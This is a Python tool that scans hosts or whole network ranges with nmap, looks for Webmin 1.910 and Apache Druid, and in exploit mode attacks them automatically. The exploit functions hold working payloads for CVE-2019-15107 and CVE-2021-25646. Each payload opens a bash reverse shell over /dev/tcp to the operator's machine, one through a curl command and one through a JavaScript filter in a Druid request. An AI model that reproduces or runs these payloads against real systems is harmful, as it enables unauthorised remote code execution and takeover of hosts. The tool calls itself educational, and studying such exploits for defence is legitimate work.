import csv
import nmap
import requests
import subprocess
import ipaddress
import sys
import argparse
import netifaces as ni
from tqdm import tqdm

BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[31m"
ENDC = "\033[0m"

def display_banner():
    banner = """
████████╗ ██████╗  ██████╗ ██╗     ██████╗  ██████╗ ██╗  ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗██╔═══██╗╚██╗██╔╝
   ██║   ██║   ██║██║   ██║██║     ██████╔╝██║   ██║ ╚███╔╝ 
   ██║   ██║   ██║██║   ██║██║     ██╔══██╗██║   ██║ ██╔██╗ 
   ██║   ╚██████╔╝╚██████╔╝███████╗██████╔╝╚██████╔╝██╔╝ ██╗
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
         Justine Fort - Evan Dessert - Mathis Fecan          
"""
    print(BLUE + banner + ENDC)

def get_current_ip():
    try:
        # Get a list of network interfaces
        interfaces = ni.interfaces()
        
        # Iterate over the network interfaces
        for interface in interfaces:
            # Get the IP addresses associated with the interface
            addresses = ni.ifaddresses(interface)
            if ni.AF_INET in addresses:
                # Check if the interface has an IPv4 address
                ip_info = addresses[ni.AF_INET][0]
                lhost = ip_info['addr']
                
                # Skip loopback and link-local addresses
                if not lhost.startswith('127.') and not lhost.startswith('169.254.'):
                    return lhost
    except Exception as e:
        print("Error:", e)

# Function to validate an IP address
def validate_ip_address(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

def validate_network_range(network_range):
    try:
        ipaddress.ip_network(network_range)
        return True
    except ValueError:
        return False

def choose_scan_type():
    try:
        scan_type = input("Do you want to scan an IP or a range? (I/R): ").lower()
        if scan_type == 'i' or scan_type == 'r':
            return scan_type
        else:
            raise ValueError("Invalid input. Please enter 'IP' or 'range'.")
    except ValueError as ve:
        print(ve)
        sys.exit(1)

def ask_ip_range(scan_type):
    if scan_type == "i":
        while True:
            adresse_ip = input(ENDC + "Provide an IP address : ")
            if validate_ip_address(adresse_ip):
                return adresse_ip
                break
            else:
                print(RED +"Invalid IP address format. Please provide a valid IP." + ENDC)
    elif scan_type == "r":
        while True:
            network_range = input(ENDC + "Provide a network range in CIDR (192.168.1.0/24) : ")
            if validate_network_range(network_range):
                return network_range
                break
            else:
                print(RED +"Invalid network address format. Please provide a valid network range.")

def net_fullscan_ask():
    net_fullscan_asking = input(ENDC + "Do you want to run a deep scan for each discoverd host ? (O/n)").lower()
    if net_fullscan_asking == "o" or net_fullscan_asking == "":
        net_fullscan = True
    else:
        net_fullscan = False
    return net_fullscan

# Function to perform a simple port scan
def simple_scan(adresse_ip):
    result_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(adresse_ip, arguments='-T5 -Pn -p 8888,10000,8080')
    except nmap.PortScannerError as e:
        print("Error while analysing the IP address :", e)
        return None, None
    for host in scanner.all_hosts():
        if 'tcp' in scanner[host]:
            for port in scanner[host]['tcp'].keys():
                state = scanner[host]['tcp'][port]['state']
                if state == 'open':
                    result_list.append(port)
    try:
        if not (result_list):
            raise ValueError(RED + "❌ No open port found on the specified host." + ENDC)
        else :
            print (f"Ports ouvers: {str(result_list)}\n")
        return result_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

def network_simple_scan(network_range,lhost):
    hosts_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(network_range, arguments='-T5 -sn -PU -PS -PA')
    except nmap.PortScannerError as e:
        print("Error while analysing the network :", e)
        sys.exit(1)
        return None, None
    for host in scanner.all_hosts():
        if host != lhost:
            hosts_list.append(host)
            hostcount = len(hosts_list)
    try:
        if not (hosts_list):
            raise ValueError(RED + "❌ No available host found on the specified network." + ENDC)
        else :
            print (BLUE + f"Available Hosts:{ENDC}\n{hosts_list}\n")
            print (BLUE + f"Nobre d'hotes : {hostcount}")
        return network_range and hosts_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

# Function to perform a detailed port scan
def better_scan(adresse_ip, open_ports):
    result_dict = {}  # Dictionary to store scan results for each IP
    scanner = nmap.PortScanner()

    try:
        scanner.scan(adresse_ip, arguments='-A')  # Use '-A' for aggressive scan
    except nmap.PortScannerError as e:
        print(f"Error scanning host {adresse_ip}: {e}")
        return None

    for port in open_ports:
        try:
            # Extract scan results
            scan_result = scanner[adresse_ip]['tcp'][port]
            protocol = 'tcp'
            port_number = port
            service_name = scan_result['name']
            state = scan_result['state']
            product = scan_result['product'] if 'product' in scan_result else None
            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
            version = scan_result['version'] if 'version' in scan_result else None
            
            # Print scan results
            print(GREEN + f"  Port: {port_number}" + ENDC)
            print(f"    Service: {service_name}")
            print(f"    State: {state}")
            print(f"    Product: {product}")
            print(f"    Version: {version}")
            print(f"    Extra Info: {extra_info}")
            
            # Check for CVEs
            vulnerability_detected = check_CVEs(service_name, product, extra_info, version)

            # Store scan results in the dictionary
            if adresse_ip not in result_dict:
                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
                                            'ports': {}}
            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
                                                             'name': service_name,
                                                             'state': state,
                                                             'product': product,
                                                             'extrainfo': extra_info,
                                                             'version': version,
                                                             'vulnerability_detected': vulnerability_detected}
            
        except nmap.PortScannerError as e:
            print(f"Error scanning port {port}:", e)
            
    return result_dict

def better_scan_exploit(adresse_ip, open_ports, lhost):
    result_dict = {}  # Dictionary to store scan results for each IP
    scanner = nmap.PortScanner()

    try:
        scanner.scan(adresse_ip, arguments='-A')  # Use '-A' for aggressive scan
    except nmap.PortScannerError as e:
        print(f"Error scanning host {adresse_ip}: {e}")
        return None

    for port in open_ports:
        try:
            # Extract scan results
            scan_result = scanner[adresse_ip]['tcp'][port]
            protocol = 'tcp'
            port_number = port
            service_name = scan_result['name']
            state = scan_result['state']
            product = scan_result['product'] if 'product' in scan_result else None
            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
            version = scan_result['version'] if 'version' in scan_result else None
            
            # Print scan results
            print(GREEN + f"  Port: {port_number}" + ENDC)
            print(f"    Service: {service_name}")
            print(f"    State: {state}")
            print(f"    Product: {product}")
            print(f"    Version: {version}")
            print(f"    Extra Info: {extra_info}")
            
            # Check for CVEs
            vulnerability_detected = check_CVEs(service_name, product, extra_info, version)

            # Store scan results in the dictionary
            if adresse_ip not in result_dict:
                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
                                            'ports': {}}
            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
                                                             'name': service_name,
                                                             'state': state,
                                                             'product': product,
                                                             'extrainfo': extra_info,
                                                             'version': version,
                                                             'vulnerability_detected': vulnerability_detected}
        except nmap.PortScannerError as e:
            print(f"Error scanning port {port}:", e)

        if vulnerability_detected == 15107:
            exploit_CVE_2019_15107(result_dict,lhost, port_number, adresse_ip)
        elif vulnerability_detected == 25646:
            exploit_CVE_2021_25646(result_dict,lhost)
        else:
            print("Not vulnerable to any CVE")


    return result_dict

def network_fullscan(net_fullscan, hosts_list):
    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
    if net_fullscan:
        print("Starting deep scan on each host and port discovered...")
        with tqdm(total=len(hosts_list)) as pbar:
            for host in hosts_list:
                scanner = nmap.PortScanner()
                try:
                    scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
                except nmap.PortScannerError as e:
                    print(f"Error scanning host {host}: {e}")
                    continue
                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                if not open_ports:
                    open_ports_str = "none"
                else:
                    open_ports_str = ", ".join(map(str, open_ports))
                print(f"Open ports for host {host}: {open_ports_str}")
                if open_ports:
                    result_dict_nw[host] = better_scan(host, open_ports)
                pbar.update(1)

def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
    if net_fullscan:
        print("Starting deep scan on each host and port discovered...")
        with tqdm(total=len(hosts_list)) as pbar:
            for host in hosts_list:
                scanner = nmap.PortScanner()
                try:
                    scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
                except nmap.PortScannerError as e:
                    print(f"Error scanning host {host}: {e}")
                    continue
                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                if not open_ports:
                    open_ports_str = "none"
                else:
                    open_ports_str = ", ".join(map(str, open_ports))
                print(f"Open ports for host {host}: {open_ports_str}")
                if open_ports:
                    result_dict_nw[host] = better_scan_exploit(host, open_ports, lhost)
                pbar.update(1)

def check_CVEs(service_name, product, extra_info, version):
    if ('MiniServ' in product.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
        print(GREEN + "Vulnerability CVE-2019-15107 detected!" + ENDC)
        return 15107
    
    elif ('sun-answerbook' in service_name.lower()):
        print(GREEN + "Vulnerability CVE-2021-25646 detected!" + ENDC)
        return 25646
    else:
        print(RED + "No vulnerability found" + ENDC)
        return False

def exploit_CVE_2019_15107(result_dict,lhost,port_number, adresse_ip):
                target_ip = adresse_ip
                target_port = port_number 
                lport = "4443"
                vuln_path = "/password_change.cgi"

                exploit_cmd = (
                    f"curl -sk -X POST 'https://{target_ip}:{target_port}{vuln_path}' "
                    "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
                    f"-H 'Referer: https://{target_ip}:{target_port}/' "
                    "-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
                )
                try:
                    subprocess.run(
                        exploit_cmd, shell=True, check=True, timeout=1
                    )
                except subprocess.TimeoutExpired:
                    print(f"Exploit attempt done, reverse shell sent to Villain {lhost}")
                finally:
                    print("Script ended.")

def exploit_CVE_2021_25646(result_dict,lhost):
    for target_ip, details in result_dict.items():
        for port, port_details in details['ports'].items():
            if port_details['vulnerability_detected']:
                target_port = port
                lport = "4443"
                url = f"http://{target_ip}:{target_port}/druid/indexer/v1/sampler"

                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "application/json",
                }

                data = {
                    "type": "index",
                    "spec": {
                        "ioConfig": {
                            "type": "index",
                            "inputSource": {
                                "type": "inline",
                                "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                            },
                            "inputFormat": {"type": "json", "keepNullColumns": True},
                        },
                        "dataSchema": {
                            "dataSource": "sample",
                            "timestampSpec": {"column": "timestamp", "format": "iso"},
                            "dimensionsSpec": {},
                            "transformSpec": {
                                "transforms": [],
                                "filter": {
                                    "type": "javascript",
                                    "dimension": "added",
                                    "function": f"function(value) {{java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/{lhost}/{lport} 0>&1')}}",
                                    "": {"enabled": True},
                                },
                            },
                        },
                        "type": "index",
                        "tuningConfig": {"type": "index"},
                    },
                    "samplerConfig": {"numRows": 500, "timeoutMs": 15000},
                }

                response = requests.post(url, headers=headers, json=data)

                print("Exploit attempt done, reverse shell sent to Villain 192.168.1.72")

def main():
    parser = argparse.ArgumentParser(description="This script will make multiple scans on hosts or network. It's meant to detect and/or exploit CVE-2019-15107 (Webmin 1.910) and CVE-2021-25646 (Apache Druid). This tool is developped for educationnal purposes, please use it only if you have explicit consent and authorisation to do so.")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan mode, this mode will attempt scans but will never exploit any vulnerability found.")
    parser.add_argument("-e", "--exploit", action="store_true", help="Exploit mode, this mode works exaclty like scan mode BUT it will attempt to exploit any vulnerability found.")

    args = parser.parse_args()

    if args.scan and args.exploit:
        print("Error: You cannot use both scan mode (-s) and exploit mode (-e) at the same time. Please choose one.")
        sys.exit(1)

    if args.scan:
        print("Scan mode activated...")
        lhost = get_current_ip()
        scan_type = choose_scan_type()

        # Prompt for network range scan
        if scan_type == "r":
            network_range = ask_ip_range(scan_type)
            hosts_list = network_simple_scan(network_range, lhost)
            net_fullscan = net_fullscan_ask()
            if net_fullscan:  # Check if net_fullscan is True
                network_fullscan(net_fullscan, hosts_list)

        # Prompt for single IP scan
        else:
            adresse_ip = ask_ip_range(scan_type)
            result_list = simple_scan(adresse_ip)
            # Perform the detailed scan and export results to CSV
            result_dict = better_scan(adresse_ip, result_list)


    elif args.exploit:
        
        print("Exploit mode activated...")
        lhost = get_current_ip()
        scan_type = choose_scan_type()
        if scan_type == "r":
            network_range = ask_ip_range(scan_type)
            hosts_list = network_simple_scan(network_range, lhost)
            net_fullscan = net_fullscan_ask()
            if net_fullscan:  # Check if net_fullscan is True
                network_fullscan_exploit(net_fullscan, hosts_list, lhost)

        # Prompt for single IP scan
        else:
            adresse_ip = ask_ip_range(scan_type)
            result_list = simple_scan(adresse_ip)
            # Perform the detailed scan and export results to CSV
            result_dict = better_scan_exploit(adresse_ip, result_list, lhost)


    else:
        print("You need to use -S (Scan) or -E (Exploit) mode")

# Prompt for user input
display_banner()
main()
